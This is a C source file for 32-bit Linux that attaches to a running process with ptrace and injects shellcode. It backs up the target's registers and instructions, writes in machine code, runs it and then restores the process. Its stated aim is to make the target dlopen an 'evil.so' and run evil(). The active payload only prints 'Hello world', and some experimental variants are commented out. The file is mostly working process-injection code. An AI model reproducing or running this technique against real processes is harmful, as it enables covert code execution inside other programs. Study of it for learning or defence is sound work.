#define _GNU_SOURCE // Will cause stdio.h to include asprintf
#define STLEN 10000
#include <fcntl.h>
#include <sys/types.h>
#include <gnu/libc-version.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include "wc.h"
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>

/*
 * This program will do the following:
 * 0. Search process memory of tracee for the address of libc and ld
 * 1. Calculate the addresses of important functions
 * 2. Attach to tracee, backing up instruction and registers
 * 3. Cause tracee to allocate RW memory and stop
 * 4. Write shellcode to malloc'ed address
 * 5. Have tracee call mprotect on malloc'ed address
 * 6. Have tracee execute shellcode, which ends with 0xcc
 * 7. Shellcode will call dlopen to load evil.so
 * 8. Shellcode will dlsym evil from evil.so and call evil()
 * 9. Upon shellcode reaching 0xcc, tracer restores instructions & registers in tracee
 * 10. Tracee continues on its merry way
 */

const int long_size = sizeof(long);

/*
 * getdata will retrieve data from the tracee
 */
void getdata(pid_t child, long addr, char *str, int len)
{   char *laddr;
    int i, j;
    union u {
            long val;
            char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;

    while(i < j) 
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }

    j = len % long_size;

    if(j != 0) 
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, j);
    }

    str[len] = '\0';
}

/*
 * putdata will insert data into the tracee
 */
void putdata(pid_t child, long addr, char *str, int len)
{   
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;

    while(i < j) 
    {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
        ++i;
        laddr += long_size;
    }

    j = len % long_size;

    if(j != 0) 
    {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
    }

}


/*
 * getLocation will search /proc/pid/maps for the base address of lib_name
 */
void* getLocation( char * lib_name, long PID)
{
    long myPID = PID; 
    char *mapLocation;
    char *map;
    FILE *fp;    // File pointer
    long nread = 0; // Size of the file
    long i;    // Counter
    char * start; // Starting point of string compare
    char * end;   // End point of string compare
    char * ptr;   // YAP

    // Set the proc map address in mapLocatin
    asprintf(&mapLocation, "/proc/%ld/maps", myPID);

    // Open mapLocation as a file
    if ((fp = fopen(mapLocation, "r")) == NULL) 
    {
        //printf("Cannot open %s\n", mapLocation);
        exit(EXIT_FAILURE);
    }
    
    // Calculate length of file 
    nread = (long)reportTotal(mapLocation);
    
    // Read the file into an array
    map = (char *)malloc((sizeof(char)*(nread+1)));
    fread(map, sizeof(char), nread, fp);
    fclose(fp);
    free(mapLocation);


    // Iterate through the memory map until we find the lib_name
    // Then, return the base address at the start of the line
    for (i = 0; i < nread; i++) 
    {
        start = end = map + i;

        while ((*end++ != '\n') && (*end) && (i++ < nread))
            ;


        for (ptr = end; (ptr > start) && (*ptr != ' '); ptr--) {
          if (((*ptr == *lib_name)) && (strncmp(ptr, lib_name, strlen(lib_name)) == 0) ) {
              free(map);
              return (((void *)strtoul(start, NULL, 16)));
          }
        }
    }
    return NULL;
}

char * convertToHex(void * address)
{
    char * hexAddress;

    unsigned char byte[4];

    int i = 0;

    for (; i < 4; i++)
    {
        byte[i] = *((unsigned char *)&address + i);
    }

    asprintf(&hexAddress, "\\x%02x\\x%02x\\x%02x\\x%02x", byte[0], byte[1], byte[2], byte[3]);

    return hexAddress;
}

void visuallyVerifyShellcode(char * shellcode, int len)
{
    char * codeinstring;
    unsigned char byte[44];

    int j = 0;

    for (;j < len; j++)
    { 
        byte[j] = *((unsigned char *)shellcode + j);
    }

    asprintf(&codeinstring, "\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x", byte[0], byte[1], byte[2], byte[3], byte[4], byte[5], byte[6], byte[7], byte[8], byte[9], byte[10], byte[11], byte[12], byte[13], byte[14], byte[15], byte[16], byte[17], byte[18], byte[19], byte[20], byte[21], byte[22], byte[23], byte[24], byte[25], byte[26], byte[27], byte[28], byte[29], byte[30], byte[31], byte[32], byte[33], byte[34], byte[35], byte[36], byte[37], byte[38], byte[39], byte[40], byte[41], byte[42]);

    printf("Shellcode is as follows: \n%s\n", codeinstring);

    return;
}

int main(int argc, char* argv[])
{
    char * lib_name;
    long thePID = getpid();

    void * dlopenaddr;
    void * dlcloseaddr;
    void * dlsymaddr;
    void * mprotectaddr;
    void * mallocaddr;
    void * putsaddr;
    void * binshaddr;

    // If there is no commandline arg, exit, else set thePID to commandline arg
    if (!argv[1])
    {
        printf("Usage: %s <pid>\n", argv[0] );
        exit(EXIT_FAILURE);
    }
    else
        thePID = atol(argv[1]);

    /*
     * This first section will calculate the location of important memory addresses:
     * dlopen(), dlclose(), dlsym(), mprotect(), and malloc();
     */
    
    // Get the name of the libc shared object
    asprintf(&lib_name, "/lib/i386-linux-gnu/i686/cmov/libc-2.19.so");

    // Search for the base address of libc in tracee process memory
    void *baseOfLibc = getLocation(lib_name, thePID);

    // Report the addres for libc
    //printf("The address of libc is: %p\n", baseOfLibc);

    // Report the offsets in libc
    //printf("Calculated libc offsets are as follows: \n");

    dlopenaddr = (void *) ( baseOfLibc + 0x1d2110 );
    //printf("dlopen address is: %p\n", dlopenaddr);

    dlcloseaddr = (void *) ( baseOfLibc + 0x1d3f70 );
    //printf("dlclose address is: %p\n", dlcloseaddr);

    dlsymaddr = (void *) ( baseOfLibc + 0x120a90 );
    //printf("dlsym address is: %p\n", dlsymaddr);

    mprotectaddr = (void *) ( baseOfLibc + 0xe5030 );
    //printf("mprotect address is: %p\n", mprotectaddr);

    putsaddr = (void *) ( baseOfLibc + 0x64d00 );
    printf("puts address is: %p\n", putsaddr);

    // Get the name of the ld shared object
    asprintf(&lib_name, "/lib/i386-linux-gnu/ld-2.19.so");

    // Search for the base address of ld in tracee process memory
    void *baseOfLd = getLocation(lib_name, thePID);

    // Report the addres for libc
    //printf("The address of ld is: %p\n", baseOfLd);

    mallocaddr = (void *) ( baseOfLd + 0x151c0 );
    printf("malloc address is: %p\n", mallocaddr);

    binshaddr = (void *) ( baseOfLd + 0x15d1a9 );
    printf("binsh address is: %p\n", mallocaddr);

    /*
     * This second section will attach to the tracee and backup instructions/registers
     */

    pid_t traced_process;
    struct user_regs_struct regs;
    long ins;
    int len = 44;

// This first shellcode is a simple printf("Hello world");
// In all shellcode cases, execution moves from dummy2 to
// migrate when we hit the \xcc

    char insertcode[] =
        "\xeb\x15\x5e\xb8"
        "\x04\x00\x00\x00"
        "\xbb\x02\x00\x00"
        "\x00\x89\xf1\xba"
        "\x0c\x00\x00\x00"
        "\xcd\x80\xcc\xe8"
        "\xe6\xff\xff\xff"
        "\x48\x65\x6c\x6c"
        "\x6f\x20\x57\x6f"
        "\x72\x6c\x64\x0a"
        "\x00\x00\x00";
/*
// This second shellcode is call malloc - not currently working
    char insertcode[] =
        "\x55\x89\xe5\x83"
        "\xec\x24\x68\xff"
        "\x13\x00\x00\xb8"
        "\x41\x41\x41\x41"
        "\xff\xd0\x50\x83"
        "\xfc\x00\x75\x04"
        "\x90\x90\xcc\x90"
        "\x68\x00\x43\x43"
        "\x43\xb8\x42\x42"
        "\x42\x42\xff\xd0"
        "\xcc\x90\x90"; 
*/
// This third shellcode is my current experiment
// This should create a stack, then
// put into eax, ebx, etc the values I need to
// call raise(SIGABRT);  This should dump core.
// If it works, I will add the malloc call in before
// I raise(SIGABRT) and follow up with dumping core.
// GDB will then let me know what is going on in dummy2.
/* 
    char insertcode[] =
        "\x55\x89\xe5\x83"
        "\xec\x24\xb8\x0e"
        "\x01\x00\x00\xbb"
        "\x44\x44\x44\x44"
        "\xb9\x45\x45\x45"
        "\x45\xba\x06\x00"
        "\x00\x00\xcd\x80"
        "\x6a\x00\xcc\x90"
        "\x90\x90\x90\x90"
        "\x90\x90\x90\x90"
        "\x90\x90\x90"; 

    /*

    unsigned long mallocptr = (unsigned long)mallocaddr;
    unsigned long putsptr   = (unsigned long)putsaddr;
    unsigned long binshptr  = (unsigned long)binshaddr;

    */

    // I will get the ppid (migrate pid) with getpid();

    unsigned long ppid = (unsigned long)getpid();
    printf("The parent pid is %ld.\n", ppid);

    
    unsigned long pid  = (unsigned long)thePID;
    printf("The migrate pid is %ld.\n", pid);


    // Reverse the pointers
    unsigned char bite[4];

    int l = 0;

    // Replacing ppid
/*    
    for (;l < 4; l++)
    {
        bite[l] = *((unsigned char *)&ppid + l);
    }
    
    memcpy(insertcode+15, bite + 3, 1);
    memcpy(insertcode+14, bite + 2, 1);
    memcpy(insertcode+13, bite + 1, 1);
    memcpy(insertcode+12, bite, 1);

    
    // Replacing pid
    
    l = 0;
    
    for (;l < 4; l++)
    {
        bite[l] = *((unsigned char *)&pid + l);
    }
    
    memcpy(insertcode+20, bite + 3, 1);
    memcpy(insertcode+19, bite + 2, 1);
    memcpy(insertcode+18, bite + 1, 1);
    memcpy(insertcode+17, bite, 1);
    */

    // It looks like we were observing the shellcode before it was changed...oops

//    visuallyVerifyShellcode(insertcode, len);
/*
    l = 0;
    for(;l < 4; l++)
    {
        bite[l] = *((unsigned char *)&mallocptr + l);
    }

    // Insert malloc function pointer to shellcode
    memcpy(insertcode+15, bite + 3, 1);
    memcpy(insertcode+14, bite + 2, 1);
    memcpy(insertcode+13, bite + 1, 1);
    memcpy(insertcode+12, bite, 1);

    l = 0;

    for(;l < 4; l++)
    {
        bite[l] = *((unsigned char *)&putsptr + l);
    }

    // Insert puts function pointer to shellcode
    memcpy(insertcode+37, bite + 3, 1);
    memcpy(insertcode+36, bite + 2, 1);
    memcpy(insertcode+35, bite + 1, 1);
    memcpy(insertcode+34, bite, 1);

    l = 0;

    for(;l < 4; l++)
    {
        bite[l] = *((unsigned char *)&binshptr + l);
    }

    // Insert binsh pointer to shellcode
    memcpy(insertcode+32, bite + 3, 1);
    memcpy(insertcode+31, bite + 2, 1);
    memcpy(insertcode+30, bite + 1, 1);
    memcpy(insertcode+29, bite, 1);

*/

    char backup[len];

    // Get the PID of the traced process
    traced_process = atoi(argv[1]);

    // Attach to that process
    ptrace(PTRACE_ATTACH, traced_process, NULL, NULL);
    wait(NULL);

    // Set regs equal to the value of the current registers
    ptrace(PTRACE_GETREGS, traced_process, NULL, &regs);

    // Make a backup of the instructions
    getdata(traced_process, regs.eip, backup, len);

    // Insert our code in place of instructions
    putdata(traced_process, regs.eip, insertcode, len);

    // Set the registers to continue execution at beginning of new instructions
    ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);

    // Continue
    ptrace(PTRACE_CONT, traced_process, NULL, NULL);
    wait(NULL);

    // When we hit the breakpoint in injected code, restore instructions and regs
    // Reset EIP to pick up where we would have been
    printf("The process stopped, Putting back " "the original instructions\n");
    putdata(traced_process, regs.eip, backup, len);
    ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);

    // Continue execution
    printf("Letting it continue with " "original flow\n");
    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);

    return 0;
}
